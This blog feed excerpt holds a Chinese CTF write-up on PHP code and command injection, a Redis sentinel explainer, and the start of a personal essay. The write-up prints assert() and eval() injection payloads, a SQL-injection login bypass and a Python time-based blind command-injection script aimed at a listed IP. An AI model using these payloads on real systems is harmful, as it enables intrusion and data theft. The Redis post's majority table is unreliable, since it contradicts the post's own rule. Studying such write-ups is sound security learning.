        <content type="html"><![CDATA[<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>额 没啥，类似于一句话木马的官方话吧<br>常见php命令注入函数<br>eval(),，assert(), system()，preg_replace(), create_function, call_user_func, call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec()<br>eval()函数可以把字符串按照PHP代码来执行，换句话说，就是可以动态地执行PHP代码，使用eval函数需要注意的是：输入的字符串必须是合法的PHP代码，且必须以分号结尾。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$myvar</span> <span class="token operator">=</span> <span class="token string">"varname"</span><span class="token punctuation">;</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\$myvar = $x;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>poc<br><code>/index.php?arg=1;phpinfo()</code></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p>jarvios的babyphp<br><img src="2.png" alt=""><br>可以目录扫描一下，有.git文件夹泄露<br><img src="3.png" alt=""><br>通过githack还原源码<br><img src="4.png" alt=""><br>审计发现下面漏洞</p><pre class=" language-php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"templates/"</span> <span class="token punctuation">.</span> <span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">".php"</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"strpos('$file', '..') === false"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Detected hacking attempt!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"file_exists('$file')"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"That file doesn't exist!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>首先加上前缀后缀，第二行规则不允许出现两个点，<code>.php</code>已经出现了一个点，所以page参数允许出现点，第二行strpos(xxx,zzz)在xxx中寻找zzz，如果成功返回字符位置，如果没有则返回false就可以注入了<br>比如执行phpinfo();<br>我们传入<code>page=&#39;) or phpinfo();#</code>,如此<code>$file=templates/&#39;) or phpinfo();#.php</code>,为了讲解我没转义，大家需要自己先urldecode<br>然后下面变成</p><pre class=" language-php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"strpos('templates/') or phpinfo();#.php', '..') === false"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Detected hacking attempt!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"file_exists('templates/') or phpinfo();#.php')"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"That file doesn't exist!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我觉得不行啊，#后面注释后句子变成</p><pre class=" language-php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span>"<span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'templates/'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#.php</span><span class="token string">')") or die("That file doesn'</span>t exist<span class="token operator">!</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>都没闭合<br><img src="5.png" alt=""><br>这谁顶得住的，我自己构造<code>page=&#39;) or phpinfo();&quot;)#</code>,缺报错了，黑人问号jpg,我觉得应该是我有语法错误了</p><h2 id="！！！以上理解是错误的！！"><a href="#！！！以上理解是错误的！！" class="headerlink" title="！！！以上理解是错误的！！"></a>！！！以上理解是错误的！！</h2><p>从这句分析</p><pre class=" language-php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"strpos('templates/') or phpinfo();#.php', '..') === false"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Detected hacking attempt!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>其实其中的#号没有将后面的注释只是将语句注释了，所以同义为</p><pre class=" language-php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"strpos('templates/') or phpinfo();"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Detected hacking attempt!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>2333  awsl-所以遇到问题本地多测试一下很重要-ε=ε=ε=┏(゜ロ゜;)┛</p><p>然后就可以为所欲为</p><pre><code>page=&#39;) or print_r(file_get_contents(&#39;templates/flag.php&#39;));#转码page=&#39;)%20or%20print_r(file_get_contents(&#39;templates%2fflag.php&#39;))%3b%23</code></pre><p><img src="6.png" alt=""><br>另外一种构造</p><pre><code>page=&#39;.system(&quot;{PHPCODE}&quot;).&#39;</code></pre><p>比如</p><pre><code>page=&#39;.system(&quot;ls&quot;).&#39;page=&#39;.system(&quot;cat templates/flag.php;&quot;).&#39;</code></pre><p>ps:system 函数是不需要输出的，只要执行了就会输出来,<br>其实发现注入第二个也是可以的-php真玄学<br><img src="7.png" alt=""></p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="一、神塔么shell注入"><a href="#一、神塔么shell注入" class="headerlink" title="一、神塔么shell注入"></a>一、神塔么shell注入</h4><p>一个题先绕过</p><pre class=" language-php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username,password FROM admin WHERE username='"</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token punctuation">}</span></code></pre><p>payload</p><pre><code>username=admin&#39; union select 1,md5(1)%23password=1</code></pre><p>然后出现一个shell注入，命令远程会执行，但是没有回显，只有那个一个进程的，盲猜应该是ps -aux | grep {命令}<br><img src="1.png" alt=""><br>方法1当然可以直接反弹shell远程，还有一个方法就是shell注入,需要修改一下PHPSESSID<br>注入语句</p><pre class=" language-shell"><code class="language-shell">c=123;a=`ls`;b='a';if [ ${a:0:1} == $b ];then sleep 2;fi</code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://123.206.31.85:49165/index.php'</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>allString <span class="token operator">=</span> <span class="token triple-quoted-string string">'''1234567890~`!@#$%^&amp;*()-_=+[]{};:'"|\,&lt;.>/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span>database <span class="token operator">=</span> <span class="token string">''</span>flag <span class="token operator">=</span> <span class="token number">1</span>comm <span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">'输入指令：'</span><span class="token punctuation">)</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'</span><span class="token punctuation">,</span>            <span class="token string">'Accept'</span><span class="token punctuation">:</span><span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span><span class="token punctuation">,</span>            <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span><span class="token string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="token punctuation">,</span>            <span class="token string">'Referer'</span><span class="token punctuation">:</span><span class="token string">'http://123.206.31.85:49165/index.php'</span><span class="token punctuation">,</span><span class="token punctuation">}</span>cookies <span class="token operator">=</span> dict<span class="token punctuation">(</span>PHPSESSID<span class="token operator">=</span><span class="token string">'d637ecrlrp3ae9jgqqunu97f22'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#根据自身需要改长度，如果空格连续出现四次以上，就说明后续没内容了</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> allString<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#header = {</span>            <span class="token comment" spellcheck="true">#"X-Forwarded-For":"1'+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#"%(i,ord(j))</span>            <span class="token comment" spellcheck="true">#}</span>        <span class="token comment" spellcheck="true">#print(j)</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"^"</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#print('此处有空格')</span>            j <span class="token operator">=</span> <span class="token string">" "</span>            data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'c'</span><span class="token punctuation">:</span><span class="token string">"123;a=`"</span><span class="token operator">+</span>comm<span class="token operator">+</span><span class="token string">"`;b=' ';if [ ${a:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">":1} == $b ];then sleep 4;fi"</span><span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'c'</span><span class="token punctuation">:</span><span class="token string">"123;a=`"</span><span class="token operator">+</span>comm<span class="token operator">+</span><span class="token string">"`;b=\'"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\';if [ ${a:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">":1} == $b ];then sleep 4;fi"</span><span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>        t <span class="token operator">=</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(r.text)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>database<span class="token operator">+</span><span class="token string">'     '</span><span class="token operator">+</span><span class="token string">'the time of '</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">' is '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> t <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">:</span>            database <span class="token operator">=</span> database <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'the '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' place of database is '</span><span class="token operator">+</span>j<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">elif</span> t <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token operator">and</span> j <span class="token operator">==</span> <span class="token string">'M'</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span>database<span class="token punctuation">)</span></code></pre><h4 id="“百度杯”CTF比赛-十月场-hash"><a href="#“百度杯”CTF比赛-十月场-hash" class="headerlink" title="“百度杯”CTF比赛 十月场 hash"></a>“百度杯”CTF比赛 十月场 hash</h4><p>通过别的途径获得源码 得到</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'val'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'val'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'$value="'</span> <span class="token punctuation">.</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'";'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hahaha!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>首先 addslashes() 函数<br>在每个双引号（”）前添加反斜杠：</p><pre><code>&lt;?php $str = addslashes(&#39;Shanghai is the &quot;biggest&quot; city in China.&#39;);echo($str); ?&gt; 输出Shanghai is the \&quot;biggest\&quot; city in China.  </code></pre><p>poc</p><pre><code>?val=${eval($_GET[a])}&amp;a=echo `ls`;?val=${eval($_GET[a])}&amp;a=echo `cat True_F1ag_i3_Here_233.php| base64`;</code></pre><h4 id="X-Forwarded-For可选地址"><a href="#X-Forwarded-For可选地址" class="headerlink" title="X-Forwarded-For可选地址"></a>X-Forwarded-For可选地址</h4><pre><code>192.168.0.0172.16.0.010.0.0.0127.0.0.0localhost</code></pre><p><code>X-Forwarded-For对应$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP-Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis哨兵核心选举算法-通过开车理解quorum和majority的意义</title>
      <link href="/2019/07/13/redis-shao-bing-he-xin-xuan-ju-suan-fa-tong-guo-kai-che-li-jie-quorum-he-majority-de-yi-yi/"/>
      <url>/2019/07/13/redis-shao-bing-he-xin-xuan-ju-suan-fa-tong-guo-kai-che-li-jie-quorum-he-majority-de-yi-yi/</url>
      
        <content type="html"><![CDATA[<h4 id="楔子：刚好在整Redis缓存高可用，阿汤哥的一句话Redis哨兵集群只有2个节点无法正常工作把俺给说晕了，网上也没找到比较通俗易懂的文章-所以自己理解了一下哨兵选举算法，为啥两个结点就是一个死局？。才疏学浅有错误的地方还望指出，多多包涵"><a href="#楔子：刚好在整Redis缓存高可用，阿汤哥的一句话Redis哨兵集群只有2个节点无法正常工作把俺给说晕了，网上也没找到比较通俗易懂的文章-所以自己理解了一下哨兵选举算法，为啥两个结点就是一个死局？。才疏学浅有错误的地方还望指出，多多包涵" class="headerlink" title="楔子：刚好在整Redis缓存高可用，阿汤哥的一句话Redis哨兵集群只有2个节点无法正常工作把俺给说晕了，网上也没找到比较通俗易懂的文章,所以自己理解了一下哨兵选举算法，为啥两个结点就是一个死局？。才疏学浅有错误的地方还望指出，多多包涵"></a>楔子：刚好在整Redis缓存高可用，阿汤哥的一句话<code>Redis哨兵集群只有2个节点无法正常工作</code>把俺给说晕了，网上也没找到比较通俗易懂的文章,所以自己理解了一下哨兵选举算法，为啥两个结点就是一个死局？。才疏学浅有错误的地方还望指出，多多包涵</h4><h3 id="一、类比开车举报算法"><a href="#一、类比开车举报算法" class="headerlink" title="一、类比开车举报算法"></a>一、类比开车举报算法</h3><h4 id="1-1、假如kitty萌新来到了一个不允许开车的世界-人们互相监督其他人是不是在开车，最开始大家都没有证据"><a href="#1-1、假如kitty萌新来到了一个不允许开车的世界-人们互相监督其他人是不是在开车，最开始大家都没有证据" class="headerlink" title="1.1、假如kitty萌新来到了一个不允许开车的世界,人们互相监督其他人是不是在开车，最开始大家都没有证据"></a>1.1、假如kitty萌新来到了一个不允许开车的世界,人们互相监督其他人是不是在开车，最开始大家都没有证据</h4><a id="more"></a><p><img src="1.jpg" alt=""></p><p>假如一旦确认为了周某开车了，并且有了证据，那么我们将对这个老司机判刑，但是还是需要人民在法院投票确定是否周某犯了开车罪，所有人民同时拥有举报和投票的权利，但是如果你被举报，你将剥夺投票自己是否入刑的权利（总不能说我认为我没开车嘛<br><img src="4.jpg" alt=""></p><p>当然，我们假设这个世界只要有人民指出一个人在开车我们就可以说有证据了，就可以交往法院裁决，由人民投票，假如这个世界有n个人.<br><code>那么问题来了，多少个人举报才算有证据，多少人投票同意判刑周某才能入狱</code><br>于是这个世界的老大在《不允许开车法》中写入一下几条<br>（首先给出一些定义，n表示世界总人数，quorum代表举报周某开车的人数，majority代表大多数人-可以理解为这个值代表了大多数人民的选择-在n确定的时候为定值）</p><pre><code>1、首先quorum一定要大于等于12、如果quorum&lt;majority，那么法院投票同意入刑的人要多于majority才能入刑3、如果quorum&gt;=majority, 那么需要法院投票同意入刑的人要多于quorum才能入刑4、majority取值如下:n= 2，majority=2n= 3，majority=2n= 4，majority=2n= 5，majority=3......</code></pre><p>我们来讨论一下这三条<br>1、第一条肯定是没问题的，必须要有人举报才能送温暖嘛<br>2、第二条意思就是如果是少数人举报周某开车，那么需要大多数人投票入刑才能生效、<br>3、第三条就是如果举报的人数已经多与了国家的majority都认为周某开车，那么仅仅是majority投票法院是不够的，可能是因为入刑生效是严肃的，具体细节去问那个世界的扛把子<br>4、这个算法其实类似于(n+1)/2向下取整,但是除了2个人的时候，法律就是法律吧。</p><h4 id="1-2、所以现在模拟两个场景"><a href="#1-2、所以现在模拟两个场景" class="headerlink" title="1.2、所以现在模拟两个场景"></a>1.2、所以现在模拟两个场景</h4><h5 id="场景1、这个世界只有两个人，A举报B开车是否有效"><a href="#场景1、这个世界只有两个人，A举报B开车是否有效" class="headerlink" title="场景1、这个世界只有两个人，A举报B开车是否有效"></a>场景1、这个世界只有两个人，A举报B开车是否有效</h5><p>分析：</p><ul><li>这个环境中n=2,majority=2,quorum=1（世界人数2，根据法律majority人数为2，只有A一个人举报了B所以quorum=1</li><li>因为quorum&gt;0,所以举报生效</li><li>根据规则<code>quorum&lt;majority</code>,所以需要majority（2）个人投票有罪</li><li>但是现在只有A一个人拥有投票权限，所以无效</li></ul><h5 id="场景2、假如这个世界有三个人，A-B-C中有人举报了C开车-并且A-B都愿意将C投票入狱"><a href="#场景2、假如这个世界有三个人，A-B-C中有人举报了C开车-并且A-B都愿意将C投票入狱" class="headerlink" title="场景2、假如这个世界有三个人，A,B,C中有人举报了C开车,并且A,B都愿意将C投票入狱"></a>场景2、假如这个世界有三个人，A,B,C中有人举报了C开车,并且A,B都愿意将C投票入狱</h5><p>分析1：假如A,B中有一个人举报了C</p><ul><li>这个环境中n=3,majority=2,quorum=1（世界人数2，根据法律majority人数为2，有一个人举报了C所以quorum=1</li><li>因为quorum&gt;0,所以举报生效</li><li>根据规则<code>quorum&lt;majority</code>,所以需要majority（2）个人投票有罪</li><li>现在有A，B两个个人拥有投票权限，所以投票有效</li></ul><p>分析2：假如A,B中两个人都举报了C</p><ul><li>这个环境中n=3,majority=2,quorum=2（世界人数2，根据法律majority人数为2，两个人都举报了C所以quorum=1</li><li>因为quorum&gt;0,所以举报生效</li><li>根据规则<code>quorum&gt;=majority</code>,所以需要quorum（2）个人投票有罪</li><li>现在有A，B两个个人拥有投票权限，所以投票有效</li></ul><h4 id="（以上则是经典的Redis三节点哨兵集群"><a href="#（以上则是经典的Redis三节点哨兵集群" class="headerlink" title="（以上则是经典的Redis三节点哨兵集群"></a>（以上则是经典的Redis三节点哨兵集群</h4><h3 id="二、Redis哨兵核心选举算法分析（严肃脸"><a href="#二、Redis哨兵核心选举算法分析（严肃脸" class="headerlink" title="二、Redis哨兵核心选举算法分析（严肃脸"></a>二、Redis哨兵核心选举算法分析（严肃脸</h3><p>这个需要先了解Redis主从架构，如果您还不熟悉，可以先移步<a href="https://kit4y.github.io/2019/07/11/Redis%E4%B8%BB%E4%BB%8E%E6%9E%B6%E6%9E%84%E4%BB%A5%E5%8F%8Avm-centOS-7-minimal%E7%89%88%E6%9C%AC%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%B0%8F%E8%AE%B0/">Redis主从架构以及vm-centOS-7-minimal版本网络配置小记</a></p><h4 id="2-1、哨兵的主要功能如下"><a href="#2-1、哨兵的主要功能如下" class="headerlink" title="2.1、哨兵的主要功能如下"></a>2.1、哨兵的主要功能如下</h4><pre><code>（1）集群监控，负责监控redis master和slave进程是否正常工作（2）消息通知，如果某个redis实例有故障，那么哨兵负责发送消息作为报警通知给管理员（3）故障转移，如果master node挂掉了，会自动转移到slave node上（4）配置中心，如果故障转移发生了，通知client客户端新的master地址</code></pre><h4 id="2-2、Redis哨兵核心知识"><a href="#2-2、Redis哨兵核心知识" class="headerlink" title="2.2、Redis哨兵核心知识"></a>2.2、Redis哨兵核心知识</h4><p>（1）哨兵至少需要3个实例，来保证自己的健壮性</p><p>（2）哨兵 + redis主从的部署架构，是不会保证数据零丢失的，只能保证redis集群的高可用性</p><p>（3）对于哨兵 + redis主从这种复杂的部署架构，尽量在测试环境和生产环境，都进行充足的测试和演练</p><h4 id="2、3：sdown和odown两种宕机"><a href="#2、3：sdown和odown两种宕机" class="headerlink" title="2、3：sdown和odown两种宕机"></a>2、3：sdown和odown两种宕机</h4><p>sdown和odown两种失败状态</p><p>sdown是主观宕机，就一个哨兵如果自己觉得一个master宕机了，那么就是主观宕机 。</p><p>odown是客观宕机，如果quorum数量的哨兵都觉得一个master宕机了，那么就是客观宕机 。<br>sdown达成的条件很简单，如果一个哨兵ping一个master，超过了is-master-down-after-milliseconds指定的毫秒数之后，就主观认为master宕机 。</p><p>sdown到odown转换的条件很简单，如果一个哨兵在指定时间内，收到了quorum指定数量的其他哨兵也认为那个master是sdown了，那么就认为是odown了，客观认为master宕机 。</p><p>在这里宕机可以类比于上面的开车了</p><h4 id="2-4、quorum和majority"><a href="#2-4、quorum和majority" class="headerlink" title="2.4、quorum和majority"></a>2.4、quorum和majority</h4><p>算法中的核心参数，如果看了上面的类比就很容易理解，quorum表示认为某机子宕机的哨兵数量（举报开车的人数），majority表示授权进行主从切换的最少的哨兵数量（最少投票入刑的人数） 。</p><h4 id="2-5、主备切换工作"><a href="#2-5、主备切换工作" class="headerlink" title="2.5、主备切换工作"></a>2.5、主备切换工作</h4><p>1、首先至少一个哨兵认为某机宕机了<br>2、如果quorum &lt; majority，那么最少majority个哨兵授权就可以执行切换<br>3、如果quorum &gt;= majority，那么必须quorum数量的哨兵都授权才能执行切换<br>4、majority取值如下:<br>n= 2，majority=2<br>n= 3，majority=2<br>n= 4，majority=2<br>n= 5，majority=3<br>你会发现这个规则和上面的开车判断<code>一模一样</code></p><h4 id="问题回答阿汤哥：为什么Redis哨兵集群只有2个节点无法正常工作？"><a href="#问题回答阿汤哥：为什么Redis哨兵集群只有2个节点无法正常工作？" class="headerlink" title="问题回答阿汤哥：为什么Redis哨兵集群只有2个节点无法正常工作？"></a>问题回答阿汤哥：为什么Redis哨兵集群只有2个节点无法正常工作？</h4><p>和场景1一模一样，A哨兵，举报了B机</p><ul><li>这个环境中n=2,majority=2,quorum=1（2机子，根据规定majority为2，只有A举报了B所以quorum=1</li><li>因为quorum&gt;0,所以举报生效</li><li>根据规则<code>quorum&lt;majority</code>,所以需要majority（2）授权</li><li>但是现在只有A台机拥有授权权限，所以无效</li></ul><p>那么为什么三台以上就行呢，自己看场景2吧。</p><h4 id="ps-从Redis经典三节点哨兵集群看得出来，最少3个人才拥有维持规矩的基础，如果最后只剩下2个人，那么规则系统必定崩塌"><a href="#ps-从Redis经典三节点哨兵集群看得出来，最少3个人才拥有维持规矩的基础，如果最后只剩下2个人，那么规则系统必定崩塌" class="headerlink" title="ps:从Redis经典三节点哨兵集群看得出来，最少3个人才拥有维持规矩的基础，如果最后只剩下2个人，那么规则系统必定崩塌"></a>ps:从Redis经典三节点哨兵集群看得出来，最少3个人才拥有维持规矩的基础，如果最后只剩下2个人，那么规则系统必定崩塌</h4>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大学前半生和恋爱价值观的思考</title>
      <link href="/2019/07/05/da-xue-qian-ban-sheng-he-lian-ai-jie-zhi-guan-de-si-kao/"/>
      <url>/2019/07/05/da-xue-qian-ban-sheng-he-lian-ai-jie-zhi-guan-de-si-kao/</url>
      
        <content type="html"><![CDATA[<h3 id="咦-ε-ε-ε-┏-゜ロ゜-┛！今夜观日历，掐指一算，大学竟然已经过半。这两年大学生活给我带来的感受确实很刺激，感觉换了一个人生，其中有很多激动的时刻，很多难受的瞬间，更多的是平淡的生活。生活-百分之5的刺激-百分之95的平淡是有道理的，但是总觉得平淡的生活是抓不住的，真的就像手上的沙子，来不及细看就飘飘而过，平淡似乎等于了平庸，碌碌无为，饱食终日的混日子，所以打算细致总结自己的大学前半生，让今后的生活有意义"><a href="#咦-ε-ε-ε-┏-゜ロ゜-┛！今夜观日历，掐指一算，大学竟然已经过半。这两年大学生活给我带来的感受确实很刺激，感觉换了一个人生，其中有很多激动的时刻，很多难受的瞬间，更多的是平淡的生活。生活-百分之5的刺激-百分之95的平淡是有道理的，但是总觉得平淡的生活是抓不住的，真的就像手上的沙子，来不及细看就飘飘而过，平淡似乎等于了平庸，碌碌无为，饱食终日的混日子，所以打算细致总结自己的大学前半生，让今后的生活有意义" class="headerlink" title="咦 ε=ε=ε=┏(゜ロ゜;)┛！今夜观日历，掐指一算，大学竟然已经过半。这两年大学生活给我带来的感受确实很刺激，感觉换了一个人生，其中有很多激动的时刻，很多难受的瞬间，更多的是平淡的生活。生活=百分之5的刺激+百分之95的平淡是有道理的，但是总觉得平淡的生活是抓不住的，真的就像手上的沙子，来不及细看就飘飘而过，平淡似乎等于了平庸，碌碌无为，饱食终日的混日子，所以打算细致总结自己的大学前半生，让今后的生活有意义"></a>咦 ε=ε=ε=┏(゜ロ゜;)┛！今夜观日历，掐指一算，大学竟然已经过半。这两年大学生活给我带来的感受确实很刺激，感觉换了一个人生，其中有很多激动的时刻，很多难受的瞬间，更多的是平淡的生活。生活=百分之5的刺激+百分之95的平淡是有道理的，但是总觉得平淡的生活是抓不住的，真的就像手上的沙子，来不及细看就飘飘而过，平淡似乎等于了平庸，碌碌无为，饱食终日的混日子，所以打算细致总结自己的大学前半生，让今后的生活有意义</h3><a id="more"></a><h3 id="一、我眼中的大学"><a href="#一、我眼中的大学" class="headerlink" title="一、我眼中的大学"></a>一、我眼中的大学</h3><p><code>大学之道,在明明德,在亲民,在止于至善.</code>-这是哪个<code>子</code>写的就先不管了，反正肯定是个♂哲学家吧。我一直觉得这句话很明显就没有包含技术，技能的要求，所以我觉得一个大学生所具备的绝不仅是技术。可能这句话确实对于现在的社会不是很贴切，我个人是觉得从这两年的生活来看，大学就是一个多样的平台，这个平台上有的人可以站在舞台中央展示自己，有的人也可以自己在墙角享受自己的小提琴。大学这个平台提供了非常多独一无二的资源，比如一个学会如何交友的平台，一个追求自己技术的平台，更残暴的说一个给你找女朋友得平台。总之我认为大学<code>==</code>平台，并且大学<code>===</code>平台，曾经刚入学的自己，仿佛一切都在模仿别人，模仿那些好学生，好学生不翘课，所以每节课乖乖坐好，好学生考前每次都刷三五套卷子背三五晚的概念，坏学生就是五花八门（形容大学生在期末周花五天复习八门功课），大一上的绩点所以还算不错。这样固然不是错的，但是我仅仅是觉得这只是利用了这个平台很小的一部分资源。但是我认为这样并不能成为大学生，比如大一曾经学的数字电路当初强记的概念，现在又剩下了多少。某位曹哲学家曾经说过，<code>在大学你可以选择当两种人，基础非常扎实绩点非常高的大学霸，和绩点不高但是技术很强的大佬，如果你绩点非常低、技术又非常差，那么你在大学就是废物</code>所以到了大一下绩点开始往下坠，大二的话一部分课免听一部分课没怎么上，但是确实自己想知道自己想学什么。大一学线性代数没用学校教材，自购了一本<a href="https://book.douban.com/subject/1425950/" target="_blank" 